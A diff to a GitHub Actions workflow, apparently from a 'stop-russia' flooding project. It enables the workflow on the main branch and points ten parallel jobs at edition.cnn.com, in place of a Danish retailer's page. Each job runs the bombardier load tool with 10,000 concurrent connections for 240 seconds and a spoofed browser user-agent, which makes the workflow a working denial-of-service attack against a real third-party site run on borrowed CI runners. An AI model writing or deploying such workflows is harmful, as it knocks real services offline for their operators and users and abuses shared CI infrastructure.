@@ -7,10 +7,10 @@ name: Run Docker Command
 on:
   push:
     branches:
-      - nomain
+      - main
   pull_request:
     branches:
-      - nomain
+      - main
 
 jobs:
   run-docker-command-1:
@@ -25,7 +25,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: | 
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
 
   run-docker-command-2:
@@ -40,7 +40,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
 
   run-docker-command-3:
@@ -55,7 +55,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
   run-docker-command-4:
     runs-on: ubuntu-latest
@@ -69,7 +69,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
   run-docker-command-5:
     runs-on: ubuntu-latest
@@ -83,7 +83,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
 
   run-docker-command-6:
@@ -98,7 +98,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
 
   run-docker-command-7:
@@ -113,7 +113,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
 
   run-docker-command-8:
@@ -128,7 +128,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
 
   run-docker-command-9:
@@ -143,7 +143,7 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
 
   run-docker-command-10:
@@ -158,5 +158,5 @@ jobs:
         with:
             image: abagayev/stop-russia:latest
             run: |
-                  export url="https://www.rossmann.dk/da/andet/r/"
+                  export url="https://edition.cnn.com/"
                   bombardier -c 10000 -d 240s -l -H "user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" $url
